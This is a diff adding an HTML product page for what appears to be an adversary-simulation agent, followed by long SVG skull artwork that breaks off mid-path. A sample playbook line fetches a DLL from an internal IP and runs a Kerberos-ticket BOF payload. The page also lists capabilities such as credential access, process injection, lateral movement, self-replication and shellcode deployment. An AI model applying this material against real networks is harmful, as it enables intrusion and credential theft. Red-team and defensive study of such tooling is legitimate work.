+      { <span class="string">"op"</span>: <span class="string">"store_result"</span>, <span class="string">"var"</span>: <span class="number">10</span> },
+      { <span class="string">"op"</span>: <span class="string">"write_file"</span>, <span class="string">"path"</span>: <span class="string">"%1"</span>, <span class="string">"content"</span>: <span class="string">"$10"</span> },
+      { <span class="string">"op"</span>: <span class="string">"pyexec"</span>, <span class="string">"url"</span>: <span class="string">"http://10.0.1.254/python38.dll"</span>,<span class="callout-marker">4</span>
+        <span class="string">"script"</span>: <span class="string">"import agent\nimport base64\n\nasktgt_b64 = agent.http_send(...)\nasktgt_bof = base64.b64decode(asktgt_b64)..."</span> }
+    ]
+  }
+}</pre>
+                </div>
+            </div>
+
+            <div class="callouts-list">
+                <div class="callout-item">
+                    <div class="callout-number">1</div>
+                    <div class="callout-text"><strong>Constants</strong> — Reusable data like BOF payloads, C2 domains, file paths, and credentials defined once and referenced by index throughout the playbook.</div>
+                </div>
+                <div class="callout-item">
+                    <div class="callout-number">2</div>
+                    <div class="callout-text"><strong>Task Sets</strong> — Pre-defined agent behaviors identified by numeric IDs. Each task set contains a sequence of operations the agent will execute.</div>
+                </div>
+                <div class="callout-item">
+                    <div class="callout-number">3</div>
+                    <div class="callout-text"><strong>Opcodes</strong> — The agent supports a variety of opcodes for offensive operations: privilege escalation, process injection, lateral movement, credential access, and more.</div>
+                </div>
+                <div class="callout-item">
+                    <div class="callout-number">4</div>
+                    <div class="callout-text"><strong>Embedded Python</strong> — Full Python scripting support including standard libraries and direct access to all agent opcodes via the <code>agent</code> module.</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="capabilities">
+        <div class="section-header">
+            <span class="section-number">02</span>
+            <span class="section-title">Core Capabilities</span>
+            <div class="section-line"></div>
+        </div>
+        <div class="capabilities-grid">
+            <div class="capability-card fade-in">
+                <div class="capability-icon">▶</div>
+                <h3>Playbook-Driven Simulation</h3>
+                <p>
+                    Define attack sequences in human-readable JSON, compile to compact bytecode, 
+                    and execute controlled simulations that mirror actual threat actor behavior 
+                    with precision timing. AI-friendly format makes playbook generation simple.
+                </p>
+            </div>
+            <div class="capability-card fade-in">
+                <div class="capability-icon">◎</div>
+                <h3>Rich Technique Coverage</h3>
+                <p>
+                    Process injection, credential access, lateral movement, persistence mechanisms, 
+                    registry manipulation, Active Directory attacks, token manipulation, and more. 
+                    Cobalt Strike BOF support for any techniques not covered natively.
+                </p>
+            </div>
+            <div class="capability-card fade-in">
+                <div class="capability-icon">λ</div>
+                <h3>Embedded Python Runtime</h3>
+                <p>
+                    Extend simulations with Python scripts for custom logic, data transformation, 
+                    or integration workflows. Full access to standard libraries and all agent 
+                    opcodes via the <code>agent</code> module.
+                </p>
+            </div>
+            <div class="capability-card fade-in">
+                <div class="capability-icon">◇</div>
+                <h3>Minimal Footprint</h3>
+                <p>
+                    Compiles to position-independent shellcode with minimal footprint. Can be 
+                    deployed—and deploy itself—as an executable, DLL, or service executable 
+                    for maximum flexibility.
+                </p>
+            </div>
+        </div>
+
+        <div class="limitation-card fade-in">
+            <h4>⚠ Current Limitations</h4>
+            <p>
+                No EDR evasion built-in currently. The COFF loader is functional but not stealthy. This can be addressed quickly if needed. 
+                Custom loaders can be developed and behavior extended via Python scripts or BOFs. Additional opcodes planned for future development.
+            </p>
+        </div>
+    </section>
+
+    <section id="architecture">
+        <div class="section-header">
+            <span class="section-number">03</span>
+            <span class="section-title">Technical Architecture</span>
+            <div class="section-line"></div>
+        </div>
+        <div class="architecture-content fade-in">
+            <div class="arch-details">
+                <h3>Engineering Highlights</h3>
+                <div class="arch-feature">
+                    <div class="arch-feature-icon">▣</div>
+                    <div>
+                        <h4>Position-Independent Code</h4>
+                        <p>Compiles to shellcode that can execute from any memory location. Ideal for injection testing and memory-resident simulation scenarios.</p>
+                    </div>
+                </div>
+                <div class="arch-feature">
+                    <div class="arch-feature-icon">⊕</div>
+                    <div>
+                        <h4>Opcode Architecture</h4>
+                        <p>Each technique is an opcode in the bytecode VM. New techniques can be developed and added quickly if needed, or implemented directly in a Python script or BOF.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Skull Replication Animation -->
+            <div class="replication-animation">
+                <div class="animation-title">Agent Self-Replication</div>
+                <div class="animation-stage">
+                    <!-- Original Skull -->
+                    <div class="skull-agent skull-1">
+                        <div class="task-label">task_set 0</div>
+                        <svg viewBox="0 0 1600 1600">
+                            <path d="M1085.53,1087.87c-.51,6.79-1.19,13.58-1.48,20.38-.28,6.44.23,12.94-.31,19.35-.5,5.93-1.93,11.78-4.37,17.66-5.2-25.71-10.4-51.42-15.6-77.13-.99-.54-1.99-1.08-2.98-1.62-6.87,12.15-14.73,23.86-20.34,36.56-5.97,13.49-10.09,27.84-14.29,42.03-.69,2.33,1.56,7.03,3.82,8.47,11.54,7.33,12.54,17.34,9.91,29.49-1.32,6.11-.23,12.74-.23,20.34-2.8-6.27-5.09-11.39-8.64-19.35-12.53,19.08-25.94,34.56-33.37,52.53-5,12.09-1.37,27.69-1.92,41.71-.2,5.24-1.3,10.44-2.29,17.89-6.55-12.87-11.67-22.94-18.04-35.45-8.12,17-8.42,30.32-5.42,45.04,4.04,19.84-3.44,38.86-7.67,61.39-2.85-4.6-4.37-5.95-4.48-7.4-1.6-20.34-3.01-40.69-4.44-61.04-.51-7.2-.6-14.45-1.63-21.57-.34-2.36-3.02-4.39-4.62-6.57-2.37,1.98-6.98,4.21-6.79,5.9,3.26,29.05-10.53,57.86-1.15,86.96,1.1,3.4.8,7.26,1.19,11.36h-39.51c9.6-1.06,9.16-6.66,7.51-14.54-1.68-8.04-1.42-16.59-1.2-24.9.56-20.87,3.06-41.81,1.81-62.55-.7-11.51-7.3-22.68-11.55-33.88-.22-.59-3.33-.08-6.08-.08,5.47-9.21,10.47-17.61,16.66-28.01-14.43,1.45-19.41,9.57-23.35,18.46-3.05,6.88-5.32,14.1-7.88,21.19-.51,1.41-1.33,3.03-1.07,4.37,4.98,25.47-2.7,49.72-8.12,73.9-3.35,14.95-10.79,28.97-18.2,42.87,3.17-19.08,8.47-37.6,1.82-59.28-2.89,18.59-5.4,34.76-7.11,45.83,0-13.87-.22-32.72.05-51.57.39-27.88-16.46-54.39-45.74-52.61-31.67,1.92-46.4,15.89-46.77,48.11-.23,20.4-.04,40.79-.04,59.97-1.48-5.78-3.41-13.3-5.33-20.83-1.36-.02-2.72-.05-4.08-.07-.68,9.18-1.36,18.35-2.2,29.73-1.99-1.21-5.86-2.24-6.29-4.07-2.58-10.92-4.03-22.11-6.59-33.04-.92-3.93-4.89-7.18-5.69-11.11-5.19-25.42-9.29-50.86-8.54-77.12.57-20.21-8.2-29.89-26.97-33.39,6.82,12.86,13.04,24.6,19.26,36.34-.81.49-1.62.98-2.44,1.46-2.75-2.38-5.49-4.77-7.57-6.57-3.64,5.82-8.09,11.14-10.49,17.25-2.7,6.88-4.79,14.45-4.98,21.78-.68,25.46-.25,50.94-.71,76.41-.06,3.4-2.8,6.76-4.31,10.14-1.01-.54-2.02-1.07-3.02-1.61-1.19-20.53-2.37-41.06-3.56-61.59-1.32,0-2.64,0-3.97,0v60.32c-1.4.14-2.8.27-4.21.41-3.57-18.55-8.59-36.98-10.33-55.7-1.79-19.38-.4-39.05-.4-58.6,1.89-.17,3.78-.34,5.67-.5,2.78,15.19,5.56,30.38,8.35,45.56.35.06.71.12,1.06.18,0-12.14,1.78-24.63-.51-36.33-2.19-11.18-8.62-21.54-14.32-34.91-1.43,8.05-1.9,13.91-3.58,19.39-3.06,10.04-8.74,19.64-9.93,29.82-2.68,22.8-3.3,45.85-4.7,68.8-.18,2.97-.02,5.96-.02,9.34-11.04-.58-9.12-9.04-10.5-15.02-1.31-5.68-2.49-11.49-2.78-17.29-.23-4.7.06-9.79,1.65-14.14,5.44-14.88,1.15-35.68-11.13-45.43-.72,5.33-1.32,9.8-1.92,14.26-.64.18-1.28.36-1.92.54-1.13-3.89-2.79-7.71-3.31-11.68-1.65-12.61-1.65-25.58-4.65-37.83-2.58-10.51-8.69-19.75-20.33-23.82-2.77-.97-5.12-4.77-6.51-7.79-4.06-8.79-7.45-17.97-21.18-13.22-.24-.98-.47-1.97-.71-2.95,4.4-4.66,8.42-9.78,13.3-13.87,8.27-6.92,12.65-14.48,7.82-25.32-9.11-20.46-18.04-41-27.13-61.47-.58-1.3-1.8-2.31-3.48-4.41-1.64,3.13-2.89,5.52-3.39,6.48-3.88-3.43-8.05-7.13-14.11-12.5,1.48,13.84,1.45,23.72,3.8,33.01,3.26,12.9-5.76,22.79-6.68,34.53-.12,1.5-3.14,2.78-4.81,4.16-1.51-1.88-4.16-3.67-4.33-5.67-.57-6.8.15-13.7-.36-20.51-1.9-25.55-3.82-51.1-6.29-76.59-.94-9.7-3.38-19.25-5.14-28.87-1.26.17-2.51.34-3.77.51,1.19,11.98,2.39,23.96,3.57,35.95.94,9.45,1.47,18.96,2.91,28.33,1.6,10.35-5.31,12.5-12.6,13.11-26.58,2.23-26.6,2.01-46.91,14.79,1.5,1.8,2.93,3.52,5.15,6.18h-22.98c-2.74-9.41-5.31-18.23-8.09-27.81,14.22,4.71,12.46-7.87,14.17-13.64,4.54-15.31.7-22.61-12.37-27.1,1.54-7.82,5.01-16.01,4.35-23.86-1.85-22.1,4.9-42.03,12.65-61.93,9.44-24.23,4.91-44.39-16.76-59.99-7.59-5.46-14.75-11.51-22.76-17.81-1.5,2.87-2.61,4.99-3.16,6.04-3.07-11.44-6.31-23.52-9.64-35.95,5.35-.69,6.06-4.05,2.04-11.01-4.05-7.02-10.36-15.16.2-22.87,1.39-1.01.71-5,.8-7.62.47-14.05,1.25-28.12,1.1-42.17-.06-5.22-2.37-10.42-3.75-16,6.48,1.01,8.42-4.15,8.25-11.98-.35-16.12-.11-32.26-.11-49.2,9.81.18,12.26-6.64,11.96-16.31-.45-14.44-.25-28.89-.28-43.34-.03-14.38,0-28.75,0-43.06-5.99-1.93-9.43-3.04-14.94-4.81,17.12-5.25,11.56-19.21,12.53-29.01,1.61-16.17,11.53-27.34,17.87-40.75,5.17-10.92,6.72-23.56,9.89-35.43,1.34-5.01,2.26-10.19,4.24-14.93,1.08-2.59,5.94-4.61,5.74-6.55-1.83-18.39,14.73-27.61,20.33-42.15,1.16-3.01,1.57-6.31,2.79-9.28,1.49-3.61,3.27-7.14,5.29-10.49,4.1-6.82,8.52-13.44,12.65-20.23,4.57-7.53,7.67-16.5,13.76-22.43,9.32-9.08,20.64-16.1,31.68-24.42,9.17,11.93-6.59,18.49-5.52,28.29.41.23,1.29.95,1.5.79,23.82-17.95,47.89-35.58,70.96-54.45,2.89-2.36.39-11.3.39-15,4.96-4.6,10.15-7.75,12.97-12.36,6.14-10.01,7.6-10.52,15.24-1.65,11.47-.75,17.42-7.19,22.5-17.25,4.5-8.92,12.9-15.88,19.97-24.17,2.25,3.3,5.09,6.03,6.18,9.34,3.4,10.26,8.12,11.39,16.52,4.53,2.07-1.69,7.52.33,11.26,1.26,3.7.92,7.49,4.28,10.74,3.72,27.3-4.71,54.49-10.1,81.73-15.17,2.15-.4,5.35-.83,6.57.33,6.93,6.61,11.57,1.16,17.73-3.84,6.67,12.96,17,9.75,28.85,9.15,15.46-.78,31.17,4.65,46.86,6.75,5.46.73,11.17-.51,16.75-2.31,16.14,5.69,18.86,4.97,27.62-9.55,13.85,8.12,27.24,16.73,34.37,31.87,3.64,7.74,7.14,8.76,13.21,2.59,5.48-5.57,9.61-5.73,13.59,2.65,1.93,4.06,8.02,6.15,13.84,10.26-.26,27.53,26.18,36.53,44.66,51.6,9.71,7.92,21.28,13.57,32.09,20.29,2.28-7.19,4.32-13.61,6.38-20.14,23.95,9.01,31.56,28.36,37.7,48.82.54,1.79.54,4.9,1.51,5.22,15.53,5.17,13.5,20.37,18.38,31.58.74,1.7,1.24,4.91,2.03,4.97,17.79,1.29,13.03,17.47,18.08,27.08,1.01,1.92,1.29,5.24,2.71,5.77,12.35,4.62,10.58,16.16,9.61,24.42-1.84,15.62,3.22,27.74,12.22,39.46,8.83,11.49,12.31,24.79,11.47,39.18-.58,10.03,1.81,18.52,13.13,23.63-16.94,1.02-16.82,1.02-16.82,17.78,0,25.07.17,50.14-.42,75.2-.22,9.59,1.27,15.81,13.59,12.43-10.33,18.4-.23,35.82-.83,53.17-.06,1.77,6.27,3.76,10.42,6.08-17.75,5.95-5.04,18.79-6.34,28.54-.88,6.62,2.19,13.67,2.68,20.59,1.11,15.62,1.77,31.27,2.46,46.91.08,1.81-.28,4.29-1.45,5.4-12,11.33-9.78,26.68-12.13,43.19-4.56-12.9-9.54-9.88-15.5-3.08-10.92,12.47-22.52,24.34-33.33,36.91-2.14,2.49-3.31,7.26-2.63,10.49,2.74,12.93,6.62,25.61,9.58,38.5.96,4.19.72,8.75.43,13.1-.29,4.29-1.33,8.53-2.05,12.8.91.23,1.83.45,2.74.68,1.14-3.46,2.29-6.91,4.38-13.23,1.36,4.96,2.43,7.22,2.54,9.52.51,10.78.44,21.59,1.21,32.34.43,5.94,1.4,9.87-4.91,15.13-10.74,8.95-6.27,22.65-5.99,37.31,4.89-4.55,7.72-7.19,10.62-9.89,7.97,11.8,5.7,21.4-7.27,29.42,2.59,1.61,4.78,2.97,6.97,4.33.01.92.02,1.84.04,2.77-7.42.9-14.85,1.79-23.34,2.82,3.82-9.99,1.69-15.47-8.24-17.19-13.22-2.29-26.24-6.08-39.53-7.51-5.81-.63-12.07,2.99-18.12,4.69,5.35-13.59,10.69-27.17,16.03-40.76-1.33-.44-2.66-.87-3.99-1.31-9.51,12.21-15.93,25.43-12,42.08ZM483.69,839.21c-.64,19.05,7.79,26.63,23.11,22.07.59,3.32.29,7.14,1.92,9.75,5.13,8.18,5.55,13.92-5.46,16.94-1.29.35-2.67,6.85-1.82,7.46,3.46,2.49,7.7,3.99,11.79,5.51,14.26,5.29,33.49-.32,40.14,17.67,17.43,2.35,34.83,1.31,49.15,7.44,20.01,8.57,36.65-3.25,55.55-1.48-.46-5.79-.79-9.93-1.31-16.33,5.5,6.03,9.34,10.25,13.18,14.46.87-.53,1.75-1.07,2.62-1.6-.41-8.84-.81-17.68-1.16-25.28,6.93,2.99,12.53,7.59,15.95,6.32,4.34-1.61,6.9-7.98,10.24-12.31.6,2.55-.58,4.18-.64,5.86-.12,3.21.39,6.45.64,9.68,3.15-.29,6.43-.11,9.42-.97,12.93-3.68,13.22-15.18,12.66-24.86-1.27-22.23-3.41-44.52-6.97-66.49-3.58-22.08-4.92-45.08-18.37-64.77-9.57.98-3.07,19.89-17.19,15.67-1.49-9.55-2.98-19.16-4.53-29.16-6.84,1.59-11.57,2.69-16.31,3.79-4.2-4.66-8.64-7.45-13.44-8.38-11.82-2.29-22.18,2.16-32.02,8.39-14.26,9.02-28.29,17.83-46.88,14.32-6.02-1.14-13.54,1.78-19.44,4.71-15.17,7.55-30.3,14.63-47.29,14.66.81,4.74,1.63,9.55,2.68,15.73-11.95-2.82-13.16,3.49-12.69,11.25.3,4.92.63,9.84.98,14.76.44,6.26.91,12.52,1.37,18.79-1.04.15-2.07.3-3.11.44,2.31,2.6,4.63,5.2,8.85,9.94-5.37-1.84-7.97-2.73-11.61-3.98ZM899.52,741.63c-13.75,22.94-16.34,45.42-19.53,67.52-2.97,20.61-5.02,41.39-6.42,62.17-.6,8.85.55,18.12,2.83,26.69.82,3.07,7.12,5.36,11.32,6.4,1.07.27,4.21-5.38,5.39-8.67,1.01-2.84.57-6.19.96-12.18,6.83,9.4,11.94,16.42,18.7,25.74,2.69-6.69,4.32-10.74,5.94-14.79.67.02,1.34.04,2.02.05,1.32,8.55,2.64,17.1,4.25,27.46,5.38-4.58,9.48-8.08,12.85-10.94-.53,5.21-1.05,10.2-1.56,15.19,4.97-.04,9.99-.51,14.91-.03,7.12.69,14.18,2.1,21.27,3.11,2.41.34,4.94.9,7.27.5,17.77-3,35.52-6.15,53.25-9.41,2.13-.39,5-1.17,5.96-2.73,6.46-10.47,15.49-14.66,27.75-13.83,4.69.32,10.03-1.1,14.22-3.34,4.9-2.62,8.85-7,15.16-12.22q-15.15-2.45-11.17-14.02c5.56-2.76,9.51-3.51,11.36-5.9,3.33-4.31,4.65-10.22,8.14-14.34,8.67-10.25,8.43-15.22-1.36-21.51,1.28-9.84,3.12-19.1,3.36-28.4.09-3.55-2.65-8.21-5.55-10.57-5.01-4.07-8.19-7.56-4.85-14.29,1.08-2.18.5-5.2.58-6.3-6.4-.35-11.67.55-15.92-1.11-9.2-3.61-17.61-9.28-26.87-12.67-6.93-2.53-14.96-4.69-22.04-3.71-16.89,2.33-31.46-.21-44.46-12.01-5.22-4.74-11.9-9.8-18.45-10.68-10.83-1.45-24-12.05-32.74,4.56-.57,1.08-3.31,1.21-5.09,1.41-10.71,1.17-16.25,9.01-14.1,20.11.46,2.38.93,4.76,1.6,8.17-14.31-1.72-16.53-11.82-18.97-25.4ZM799.89,894.37c-.76.04-1.51.08-2.27.12-.66,2.37-1.38,4.72-1.97,7.1-4.84,19.69-8.17,39.9-14.82,58.95-9.51,27.22-21.77,53.46-32.01,80.45-1.69,4.45-.81,11.73,1.87,15.68,14.34,21.12,29.63,41.6,45.98,64.22,6.93-10.61,13.91-21.87,21.52-32.7,3.68-5.23,7.92-10.47,12.99-14.25,13.83-10.32,17.65-24.59,10.66-40.55-6.6-15.06-13.71-30.07-18.36-45.76-7.15-24.11-12.38-48.79-18.45-73.21-1.66-6.69-3.43-13.36-5.15-20.04ZM821.2,258.26c1.71-10.45-3.84-12.06-12.16-11.62-7.14.38-14.73,1.07-21.37-.89-5.02-1.48-9.48-4.65-12.58,1.03-3.04,5.59-7.91,13.99-5.83,17.84,5.58,10.33,14.09,19.22,22.27,27.89,1.81,1.92,7.44,1.72,10.65.6,16.89-5.86,15.38-22,19.01-34.85ZM1128.89,931.4c1.04.15,2.07.31,3.11.46.71-3.5.6-7.47,2.28-10.42,9.37-16.49,19.62-32.48,28.67-49.13,7.25-13.33,19.24-22.61,24.58-38.38,9.2-27.19,12.28-54.35,11.68-82.38-.37-17.1-1.9-34.17-2.92-51.25-.93-.04-1.85-.07-2.78-.11-.39,3.09-.97,6.18-1.13,9.28-1.46,28.73-.98,57.72-4.92,86.1-2.65,19.11-9.76,38.2-18.12,55.76-8.14,17.13-21.09,31.9-30.59,48.48-5.46,9.53-12.28,19.53-9.88,31.6ZM408.28,696.5c-2.86,3.27-3.67,3.77-3.79,4.4-10.23,51.99-8.23,102.69,18.84,149.73,13.44,23.35,29.06,45.45,43.69,68.12,1.22-2.58,1.5-5,.49-6.63-11.45-18.52-23.01-36.97-34.71-55.33-11.48-18.02-17.52-37.9-20.44-58.85-3.91-28.05-9.72-56.01-4.2-84.58.86-4.46.12-9.23.12-16.87ZM864.07,797.12c-1.16.04-2.32.08-3.49.13v78.35c1.16,0,2.32,0,3.49,0v-78.48ZM732.79,806.17c-.95-.1-1.89-.2-2.84-.3-2.05,22.18-2.72,44.28,2.68,66,1.7-.1,3.39-.21,5.09-.31-1.64-21.79-3.29-43.59-4.93-65.38ZM940.07,1224.1c0,12.14-.16,24.29.21,36.42.04,1.43,2.92,3.77,4.57,3.84,1.43.06,4.13-2.37,4.29-3.91,1.29-12.73,1.07-25.3-9.06-36.36ZM1120.82,953.73v34.73c9.1-13.37,9.43-23.91,0-34.73ZM1178.65,559.1c-1.38.19-2.75.38-4.13.57,1.46,13.03,2.91,26.06,4.37,39.08,1.45-.19,2.9-.37,4.36-.56-1.53-13.03-3.06-26.06-4.59-39.1ZM1088.96,1045.04c1.57.14,3.15.27,4.72.41,2.6-10.79,5.2-21.58,7.8-32.36-1.18-.28-2.35-.55-3.53-.83-2.45,11.05-9.33,21.14-9,32.79ZM1163.64,467c-1.4.76-2.79,1.53-4.19,2.29,4.64,7.6,9.28,15.2,13.92,22.8,1.14-.69,2.27-1.38,3.41-2.08-4.38-7.67-8.76-15.34-13.14-23.01Z"/>
+                        </svg>
+                    </div>
+
+                    <!-- Skull 2 - Goes to EXE -->
+                    <div class="skull-agent skull-2">
+                        <div class="task-label">task_set 1</div>
+                        <svg viewBox="0 0 1600 1600">
+                            <path d="M1085.53,1087.87c-.51,6.79-1.19,13.58-1.48,20.38-.28,6.44.23,12.94-.31,19.35-.5,5.93-1.93,11.78-4.37,17.66-5.2-25.71-10.4-51.42-15.6-77.13-.99-.54-1.99-1.08-2.98-1.62-6.87,12.15-14.73,23.86-20.34,36.56-5.97,13.49-10.09,27.84-14.29,42.03-.69,2.33,1.56,7.03,3.82,8.47,11.54,7.33,12.54,17.34,9.91,29.49-1.32,6.11-.23,12.74-.23,20.34-2.8-6.27-5.09-11.39-8.64-19.35-12.53,19.08-25.94,34.56-33.37,52.53-5,12.09-1.37,27.69-1.92,41.71-.2,5.24-1.3,10.44-2.29,17.89-6.55-12.87-11.67-22.94-18.04-35.45-8.12,17-8.42,30.32-5.42,45.04,4.04,19.84-3.44,38.86-7.67,61.39-2.85-4.6-4.37-5.95-4.48-7.4-1.6-20.34-3.01-40.69-4.44-61.04-.51-7.2-.6-14.45-1.63-21.57-.34-2.36-3.02-4.39-4.62-6.57-2.37,1.98-6.98,4.21-6.79,5.9,3.26,29.05-10.53,57.86-1.15,86.96,1.1,3.4.8,7.26,1.19,11.36h-39.51c9.6-1.06,9.16-6.66,7.51-14.54-1.68-8.04-1.42-16.59-1.2-24.9.56-20.87,3.06-41.81,1.81-62.55-.7-11.51-7.3-22.68-11.55-33.88-.22-.59-3.33-.08-6.08-.08,5.47-9.21,10.47-17.61,16.66-28.01-14.43,1.45-19.41,9.57-23.35,18.46-3.05,6.88-5.32,14.1-7.88,21.19-.51,1.41-1.33,3.03-1.07,4.37,4.98,25.47-2.7,49.72-8.12,73.9-3.35,14.95-10.79,28.97-18.2,42.87,3.17-19.08,8.47-37.6,1.82-59.28-2.89,18.59-5.4,34.76-7.11,45.83,0-13.87-.22-32.72.05-51.57.39-27.88-16.46-54.39-45.74-52.61-31.67,1.92-46.4,15.89-46.77,48.11-.23,20.4-.04,40.79-.04,59.97-1.48-5.78-3.41-13.3-5.33-20.83-1.36-.02-2.72-.05-4.08-.07-.68,9.18-1.36,18.35-2.2,29.73-1.99-1.21-5.86-2.24-6.29-4.07-2.58-10.92-4.03-22.11-6.59-33.04-.92-3.93-4.89-7.18-5.69-11.11-5.19-25.42-9.29-50.86-8.54-77.12.57-20.21-8.2-29.89-26.97-33.39,6.82,12.86,13.04,24.6,19.26,36.34-.81.49-1.62.98-2.44,1.46-2.75-2.38-5.49-4.77-7.57-6.57-3.64,5.82-8.09,11.14-10.49,17.25-2.7,6.88-4.79,14.45-4.98,21.78-.68,25.46-.25,50.94-.71,76.41-.06,3.4-2.8,6.76-4.31,10.14-1.01-.54-2.02-1.07-3.02-1.61-1.19-20.53-2.37-41.06-3.56-61.59-1.32,0-2.64,0-3.97,0v60.32c-1.4.14-2.8.27-4.21.41-3.57-18.55-8.59-36.98-10.33-55.7-1.79-19.38-.4-39.05-.4-58.6,1.89-.17,3.78-.34,5.67-.5,2.78,15.19,5.56,30.38,8.35,45.56.35.06.71.12,1.06.18,0-12.14,1.78-24.63-.51-36.33-2.19-11.18-8.62-21.54-14.32-34.91-1.43,8.05-1.9,13.91-3.58,19.39-3.06,10.04-8.74,19.64-9.93,29.82-2.68,22.8-3.3,45.85-4.7,68.8-.18,2.97-.02,5.96-.02,9.34-11.04-.58-9.12-9.04-10.5-15.02-1.31-5.68-2.49-11.49-2.78-17.29-.23-4.7.06-9.79,1.65-14.14,5.44-14.88,1.15-35.68-11.13-45.43-.72,5.33-1.32,9.8-1.92,14.26-.64.18-1.28.36-1.92.54-1.13-3.89-2.79-7.71-3.31-11.68-1.65-12.61-1.65-25.58-4.65-37.83-2.58-10.51-8.69-19.75-20.33-23.82-2.77-.97-5.12-4.77-6.51-7.79-4.06-8.79-7.45-17.97-21.18-13.22-.24-.98-.47-1.97-.71-2.95,4.4-4.66,8.42-9.78,13.3-13.87,8.27-6.92,12.65-14.48,7.82-25.32-9.11-20.46-18.04-41-27.13-61.47-.58-1.3-1.8-2.31-3.48-4.41-1.64,3.13-2.89,5.52-3.39,6.48-3.88-3.43-8.05-7.13-14.11-12.5,1.48,13.84,1.45,23.72,3.8,33.01,3.26,12.9-5.76,22.79-6.68,34.53-.12,1.5-3.14,2.78-4.81,4.16-1.51-1.88-4.16-3.67-4.33-5.67-.57-6.8.15-13.7-.36-20.51-1.9-25.55-3.82-51.1-6.29-76.59-.94-9.7-3.38-19.25-5.14-28.87-1.26.17-2.51.34-3.77.51,1.19,11.98,2.39,23.96,3.57,35.95.94,9.45,1.47,18.96,2.91,28.33,1.6,10.35-5.31,12.5-12.6,13.11-26.58,2.23-26.6,2.01-46.91,14.79,1.5,1.8,2.93,3.52,5.15,6.18h-22.98c-2.74-9.41-5.31-18.23-8.09-27.81,14.22,4.71,12.46-7.87,14.17-13.64,4.54-15.31.7-22.61-12.37-27.1,1.54-7.82,5.01-16.01,4.35-23.86-1.85-22.1,4.9-42.03,12.65-61.93,9.44-24.23,4.91-44.39-16.76-59.99-7.59-5.46-14.75-11.51-22.76-17.81-1.5,2.87-2.61,4.99-3.16,6.04-3.07-11.44-6.31-23.52-9.64-35.95,5.35-.69,6.06-4.05,2.04-11.01-4.05-7.02-10.36-15.16.2-22.87,1.39-1.01.71-5,.8-7.62.47-14.05,1.25-28.12,1.1-42.17-.06-5.22-2.37-10.42-3.75-16,6.48,1.01,8.42-4.15,8.25-11.98-.35-16.12-.11-32.26-.11-49.2,9.81.18,12.26-6.64,11.96-16.31-.45-14.44-.25-28.89-.28-43.34-.03-14.38,0-28.75,0-43.06-5.99-1.93-9.43-3.04-14.94-4.81,17.12-5.25,11.56-19.21,12.53-29.01,1.61-16.17,11.53-27.34,17.87-40.75,5.17-10.92,6.72-23.56,9.89-35.43,1.34-5.01,2.26-10.19,4.24-14.93,1.08-2.59,5.94-4.61,5.74-6.55-1.83-18.39,14.73-27.61,20.33-42.15,1.16-3.01,1.57-6.31,2.79-9.28,1.49-3.61,3.27-7.14,5.29-10.49,4.1-6.82,8.52-13.44,12.65-20.23,4.57-7.53,7.67-16.5,13.76-22.43,9.32-9.08,20.64-16.1,31.68-24.42,9.17,11.93-6.59,18.49-5.52,28.29.41.23,1.29.95,1.5.79,23.82-17.95,47.89-35.58,70.96-54.45,2.89-2.36.39-11.3.39-15,4.96-4.6,10.15-7.75,12.97-12.36,6.14-10.01,7.6-10.52,15.24-1.65,11.47-.75,17.42-7.19,22.5-17.25,4.5-8.92,12.9-15.88,19.97-24.17,2.25,3.3,5.09,6.03,6.18,9.34,3.4,10.26,8.12,11.39,16.52,4.53,2.07-1.69,7.52.33,11.26,1.26,3.7.92,7.49,4.28,10.74,3.72,27.3-4.71,54.49-10.1,81.73-15.17,2.15-.4,5.35-.83,6.57.33,6.93,6.61,11.57,1.16,17.73-3.84,6.67,12.96,17,9.75,28.85,9.15,15.46-.78,31.17,4.65,46.86,6.75,5.46.73,11.17-.51,16.75-2.31,16.14,5.69,18.86,4.97,27.62-9.55,13.85,8.12,27.24,16.73,34.37,31.87,3.64,7.74,7.14,8.76,13.21,2.59,5.48-5.57,9.61-5.73,13.59,2.65,1.93,4.06,8.02,6.15,13.84,10.26-.26,27.53,26.18,36.53,44.66,51.6,9.71,7.92,21.28,13.57,32.09,20.29,2.28-7.19,4.32-13.61,6.38-20.14,23.95,9.01,31.56,28.36,37.7,48.82.54,1.79.54,4.9,1.51,5.22,15.53,5.17,13.5,20.37,18.38,31.58.74,1.7,1.24,4.91,2.03,4.97,17.79,1.29,13.03,17.47,18.08,27.08,1.01,1.92,1.29,5.24,2.71,5.77,12.35,4.62,10.58,16.16,9.61,24.42-1.84,15.62,3.22,27.74,12.22,39.46,8.83,11.49,12.31,24.79,11.47,39.18-.58,10.03,1.81,18.52,13.13,23.63-16.94,1.02-16.82,1.02-16.82,17.78,0,25.07.17,50.14-.42,75.2-.22,9.59,1.27,15.81,13.59,12.43-10.33,18.4-.23,35.82-.83,53.17-.06,1.77,6.27,3.76,10.42,6.08-17.75,5.95-5.04,18.79-6.34,28.54-.88,6.62,2.19,13.67,2.68,20.59,1.11,15.62,1.77,31.27,2.46,46.91.08,1.81-.28,4.29-1.45,5.4-12,11.33-9.78,26.68-12.13,43.19-4.56-12.9-9.54-9.88-15.5-3.08-10.92,12.47-22.52,24.34-33.33,36.91-2.14,2.49-3.31,7.26-2.63,10.49,2.74,12.93,6.62,25.61,9.58,38.5.96,4.19.72,8.75.43,13.1-.29,4.29-1.33,8.53-2.05,12.8.91.23,1.83.45,2.74.68,1.14-3.46,2.29-6.91,4.38-13.23,1.36,4.96,2.43,7.22,2.54,9.52.51,10.78.44,21.59,1.21,32.34.43,5.94,1.4,9.87-4.91,15.13-10.74,8.95-6.27,22.65-5.99,37.31,4.89-4.55,7.72-7.19,10.62-9.89,7.97,11.8,5.7,21.4-7.27,29.42,2.59,1.61,4.78,2.97,6.97,4.33.01.92.02,1.84.04,2.77-7.42.9-14.85,1.79-23.34,2.82,3.82-9.99,1.69-15.47-8.24-17.19-13.22-2.29-26.24-6.08-39.53-7.51-5.81-.63-12.07,2.99-18.12,4.69,5.35-13.59,10.69-27.17,16.03-40.76-1.33-.44-2.66-.87-3.99-1.31-9.51,12.21-15.93,25.43-12,42.08ZM483.69,839.21c-.64,19.05,7.79,26.63,23.11,22.07.59,3.32.29,7.14,1.92,9.75,5.13,8.18,5.55,13.92-5.46,16.94-1.29.35-2.67,6.85-1.82,7.46,3.46,2.49,7.7,3.99,11.79,5.51,14.26,5.29,33.49-.32,40.14,17.67,17.43,2.35,34.83,1.31,49.15,7.44,20.01,8.57,36.65-3.25,55.55-1.48-.46-5.79-.79-9.93-1